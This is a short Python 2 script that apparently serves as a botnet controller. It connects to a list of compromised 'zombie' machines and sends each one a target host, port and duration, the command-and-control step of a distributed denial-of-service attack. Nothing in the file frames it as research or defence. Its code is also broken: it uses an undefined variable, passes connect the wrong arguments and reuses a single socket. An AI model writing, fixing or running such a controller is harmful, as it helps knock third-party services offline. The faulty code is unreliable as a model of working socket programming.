import socket
import time


ZOMBIES = ["list here"]
PORT = 15000
TIMEOUT = 10000
TARGET = ""
TARGET_PORT = 80
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

for zombie in ZOMBIES:
    while True:
        try:
            data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
            sock.connect(ZOMBIE, PORT)
            sock.sendall(data + "\n")
            rec = sock.recv(1024)
            if rec != "ACK\n":
                break
        except:
            print "Trying again"
            time.sleep(3)
sock.close()
